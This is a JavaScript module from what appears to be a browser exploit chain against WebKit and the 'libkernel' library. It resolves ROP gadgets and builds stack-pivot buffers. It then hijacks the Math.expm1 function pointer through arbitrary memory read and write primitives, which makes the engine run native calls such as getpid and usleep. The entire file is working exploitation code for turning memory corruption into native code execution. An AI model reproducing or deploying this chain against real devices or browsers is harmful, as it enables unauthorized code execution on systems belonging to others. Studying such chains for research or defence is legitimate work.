/**
 * Math.expm1 pivot native call — poops-style ROP (chain_poops.js).
 * Separate ArrayBuffers (same as chain_poops). Fire at PRIMITIVE-OK when lk known.
 */
import { int64 } from "./int64.js";
import { PIVOT_ROWS, verifyPivotSet } from "./pivot_gadgets.js";

export const SYS = { getpid: 20, getuid: 0x18 };

const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
const STACK_SIZE = 0x2000;

const GADGET_TABLE = [
    ["POP_RDI_RET", "wk_POP_RDI_RET", [0x5f, 0xc3]],
    ["POP_RSI_RET", "wk_POP_RSI_RET", [0x5e, 0xc3]],
    ["POP_RDX_RET", "wk_POP_RDX_RET", [0x5a, 0xc3]],
    ["POP_RCX_RET", "wk_POP_RCX_RET", [0x59, 0xc3]],
    ["POP_R8_RET", "wk_POP_R8_RET", [null, 0x58, 0xc3]],
    ["POP_R9_RET", "wk_POP_R9_RET", [null, 0x59, 0xc3]],
    ["POP_RAX_RET", "wk_POP_RAX_RET", [0x58, 0xc3]],
    ["LEAVE_RET", "wk_LEAVE_RET", [0xc9, 0xc3]],
    ["MOV_RDI_RAX_RET", "wk_MOV_QWORD_PTR_RDI_RAX_RET", [0x48, 0x89, 0x07, 0xc3]],
    ["G0", "wk_MOV_RDI_RSI_30_CALL", [0x48, 0x8b, 0x7e, 0x30]],
    ["G1", "wk_POP_RAX_MOV_RAX_JMP_18", [0x58, 0x48, 0x8b, 0x07]],
    ["G2", "wk_PUSH_RBP_MOV_RBP_RSP_10", [0x55, 0x48, 0x89, 0xe5]],
    ["G3", "wk_MOV_RDI_RAX_8_CALL_20", [0x48, 0x8b, 0x78, 0x08]],
    ["G4", "wk_MOV_RDX_RAX_18_CALL_10", [0x48, 0x8b, 0x50, 0x38]],
    ["G5", "wk_PUSH_RDX_POP_RSP_RET", [0x52, 0x5c, 0xc3]],
];

export { verifyPivotSet, PIVOT_ROWS };

function resolveGadgetsTrust(webkitBase, off) {
    const G = {};
    for (let i = 0; i < GADGET_TABLE.length; i++) {
        const nm = GADGET_TABLE[i][0];
        const key = GADGET_TABLE[i][1];
        const rva = off[key];
        if (rva == null) return { G: null, bad: [nm] };
        G[nm] = webkitBase.add32(rva);
    }
    return { G, bad: [] };
}

function bufAddr(p, off, ab) {
    const c = p.leakval(ab);
    return p.read8(p.read8(c.add32(off.wk_ArrayBuffer_m_impl))
        .add32(off.wk_ArrayBuffer_m_contents_m_data));
}

function put(dv, at, v) {
    if (typeof v === "number") {
        dv.setUint32(at, v >>> 0, true);
        dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true);
    } else {
        dv.setUint32(at, v.low >>> 0, true);
        dv.setUint32(at + 4, v.hi >>> 0, true);
    }
}

/** chain_poops makeCtx — store / pivot / stack / frame are separate ArrayBuffers. */
function buildSlabCtx(p, off, G, keepAlive) {
    const pivotSp = off.pivot_view_sp;
    const PB_SIZE = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
    const sb = new ArrayBuffer(0x20);
    const pb = new ArrayBuffer(PB_SIZE);
    const kb = new ArrayBuffer(STACK_SIZE);
    const fb = new ArrayBuffer(0x40);
    keepAlive.push(sb, pb, kb, fb);
    const storeDv = new DataView(sb);
    const pivotDv = new DataView(pb);
    const stackDv = new DataView(kb);
    const frameDv = new DataView(fb);
    const stackU8 = new Uint8Array(kb);
    const frameU8 = new Uint8Array(fb);
    const S = bufAddr(p, off, sb);
    const P = bufAddr(p, off, pb);
    const K = bufAddr(p, off, kb);
    const F = bufAddr(p, off, fb);
    put(storeDv, 0x00, G.G1);
    put(storeDv, 0x08, P);
    put(storeDv, 0x10, G.G3);
    put(storeDv, 0x18, G.G2);
    put(pivotDv, 0x00, P);
    put(pivotDv, 0x10, G.G5);
    put(pivotDv, 0x20, G.G4);
    return {
        stackSize: STACK_SIZE,
        pivotSp,
        storeDv,
        pivotDv,
        stackDv,
        frameDv,
        stackU8,
        frameU8,
        S,
        P,
        K,
        F,
        bufs: [sb, pb, kb, fb],
    };
}

/** One ctx + pivot handles — call while heap is fresh (PRIMITIVE-OK). */
export function prepNativeChain(p, off, webkitBase, cap) {
    if (!p || !off || !webkitBase)
        throw new Error("prepNativeChain: need p, off, webkitBase");
    const resolved = resolveGadgetsTrust(webkitBase, off);
    if (!resolved.G || resolved.bad.length)
        throw new Error("prepNativeChain: gadget-bad " + resolved.bad.join(","));
    const G = resolved.G;
    const keepAlive = [];
    const M = buildSlabCtx(p, off, G, keepAlive);
    let mainMf, mainOrig, pivotObj, pivotCell;
    if (cap && cap.mainMf && cap.mainOrig != null && cap.pivotCell) {
        mainMf = cap.mainMf;
        mainOrig = cap.mainOrig;
        pivotObj = cap.pivotObj;
        pivotCell = cap.pivotCell;
    } else {
        const cell = p.leakval(Math.expm1);
        const jfn = p.read8(cell.add32(0x18));
        mainMf = jfn.add32(off.wk_JSFunction_m_function || 0x28);
        mainOrig = p.read8(mainMf);
        pivotObj = {};
        pivotCell = p.leakval(pivotObj);
    }
    keepAlive.push(pivotObj);
    return {
        M,
        G,
        mainMf,
        mainOrig,
        pivotCell,
        pivotObj,
        keepAlive,
        webkitBase,
        staged: false,
        mainArmed: false,
    };
}

function layoutNativeCall(M, G, target, args) {
    args = args || [];
    M.stackU8.fill(0);
    M.frameU8.fill(0);
    const insts = [];
    for (let i = 0; i < args.length; i++) {
        insts.push(G.POP_RDI_RET);
        insts.push(args[i]);
    }
    const targetIdx = insts.length;
    insts.push(target);
    insts.push(G.POP_RDI_RET);
    insts.push(M.F);
    insts.push(G.MOV_RDI_RAX_RET);
    insts.push(G.POP_RAX_RET);
    insts.push(JSVALUE_UNDEFINED);
    insts.push(G.LEAVE_RET);
    let at = STACK_SIZE - 8 * insts.length;
    if (((M.K.low + at + 8 * targetIdx) & 0xf) !== 0)
        at -= 8;
    for (let i = 0; i < insts.length; i++)
        put(M.stackDv, at + 8 * i, insts[i]);
    put(M.pivotDv, M.pivotSp, M.K.add32(at));
}

export function layoutGetpidSlab(M, G, stub) {
    layoutNativeCall(M, G, stub, []);
}

export function stageGetpid(p, prep, libkernelBase, off, stubOffOverride) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("stageGetpid: no prep");
    let stubOff = stubOffOverride;
    if (stubOff == null && off.k_stubs && off.k_stubs[SYS.getpid] != null)
        stubOff = off.k_stubs[SYS.getpid];
    if (stubOff == null)
        stubOff = off.k_getpid_syscall != null ? off.k_getpid_syscall : 0x4fa;
    layoutNativeCall(prep.M, prep.G, libkernelBase.add32(stubOff), []);
    prep.staged = true;
    prep.stubOff = stubOff;
}

export function stageUsleep(p, prep, libkernelBase, off, usec) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("stageUsleep: no prep");
    const fnOff = off.k_usleep != null ? off.k_usleep : 0x13b20;
    const arg = new int64((usec != null ? usec : 1000) >>> 0, 0);
    layoutNativeCall(prep.M, prep.G, libkernelBase.add32(fnOff), [arg]);
    prep.staged = true;
}

/** Pivot only — webkit POP_RAX, no libkernel (bisect lk vs chain). */
export function layoutSmokeStack(prep) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("layoutSmokeStack: no prep");
    layoutNativeCall(prep.M, prep.G, prep.G.POP_RAX_RET, [new int64(0, 0)]);
    prep.staged = true;
    prep.stagedKind = "smoke";
}

export function layoutGetpidStack(prep, libkernelBase, stubOff) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("layoutGetpidStack: no prep");
    layoutNativeCall(prep.M, prep.G, libkernelBase.add32(stubOff), []);
    prep.staged = true;
    prep.stagedKind = "getpid";
    prep.stubOff = stubOff;
}

/** Bisect step 3 — write G0 → main m_function (no expm1 yet). */
export function bisectArmG0(p, prep) {
    if (!prep || !prep.mainMf || !prep.G)
        throw new Error("bisectArmG0: no prep");
    p.write8(prep.mainMf, prep.G.G0);
    prep.mainArmed = true;
}

/** Bisect step 4 — pivot cell → store slab S (save old val). */
export function bisectHookPivot(p, prep) {
    if (!prep || !prep.pivotCell || !prep.M)
        throw new Error("bisectHookPivot: no prep");
    if (!prep._bisect) prep._bisect = {};
    prep._bisect.pivotSaved = p.read8(prep.pivotCell);
    p.write8(prep.pivotCell, prep.M.S);
}

/** Bisect step 5 — Math.expm1 pivot (runs ROP chain). */
export function bisectFireExpm1(p, prep) {
    if (!prep || !prep.pivotObj)
        throw new Error("bisectFireExpm1: no prep");
    Math.expm1(prep.pivotObj);
}

/** Bisect step 6 — restore pivot cell + main m_function. */
export function bisectRestore(p, prep) {
    if (!prep) return;
    if (prep._bisect && prep._bisect.pivotSaved != null)
        p.write8(prep.pivotCell, prep._bisect.pivotSaved);
    if (prep.mainMf && prep.mainOrig)
        p.write8(prep.mainMf, prep.mainOrig);
    prep.mainArmed = false;
    prep.staged = false;
    prep._bisect = {};
}

/** Bisect step 7+ — fire after layout (assumes hook+arm or uses full fireNativeCall). */
export function fireNativeCallBisect(p, prep) {
    return fireNativeCall(p, prep);
}

export function firePivotSmoke(p, prep) {
    if (!prep || !prep.M || !prep.G)
        throw new Error("firePivotSmoke: no prep");
    layoutSmokeStack(prep);
    return fireNativeCall(p, prep);
}

/** chain_poops callAddr — no logging, no DOM. */
export function fireNativeCall(p, prep) {
    if (!prep || !prep.M)
        throw new Error("fireNativeCall: no prep");
    if (!prep.mainArmed) {
        p.write8(prep.mainMf, prep.G.G0);
        prep.mainArmed = true;
    }
    const saved = p.read8(prep.pivotCell);
    p.write8(prep.pivotCell, prep.M.S);
    Math.expm1(prep.pivotObj);
    p.write8(prep.pivotCell, saved);
    p.write8(prep.mainMf, prep.mainOrig);
    prep.mainArmed = false;
    prep.staged = false;
    return prep.M.frameDv.getUint32(0, true) | 0;
}

export function fireUsleep(p, prep, libkernelBase, off, usec) {
    stageUsleep(p, prep, libkernelBase, off, usec);
    return fireNativeCall(p, prep);
}

export function fireGetpid(p, prep) {
    return fireNativeCall(p, prep);
}

export function runGetpidFromPrep(p, prep, libkernelBase, off) {
    stageGetpid(p, prep, libkernelBase, off);
    return fireGetpid(p, prep);
}

export function initNativeCall(p, off, opts) {
    opts = opts || {};
    const prep = opts.prep;
    if (!prep)
        throw new Error("initNativeCall: use prepNativeChain + runGetpidFromPrep on HW");
    const lk = opts.libkernelBase;
    if (!lk)
        throw new Error("initNativeCall: libkernelBase required");
    return {
        webkitBase: opts.webkitBase,
        libkernelBase: lk,
        sc(num) {
            if (num !== SYS.getpid) throw new Error("getpid only");
            if (!prep.staged)
                stageGetpid(p, prep, lk, off);
            return { i32: fireGetpid(p, prep) };
        },
        disarm() {
            if (prep.staged) {
                try { p.write8(prep.mainMf, prep.mainOrig); } catch (_) { }
                prep.staged = false;
            }
        },
    };
}

export function runGetpidProof(p, off, opts) {
    opts = Object.assign({ trust: true, noStubScan: true }, opts || {});
    const webkitBase = opts.webkitBase
        || (opts.nativeFn && off.wk_expm1_builtin
            ? opts.nativeFn.sub32(off.wk_expm1_builtin) : null);
    const prep = opts.prep || prepNativeChain(p, off, webkitBase);
    const lk = opts.libkernelBase;
    const pid = runGetpidFromPrep(p, prep, lk, off);
    return { ok: pid > 0, pid, uid: null, chain: null };
}
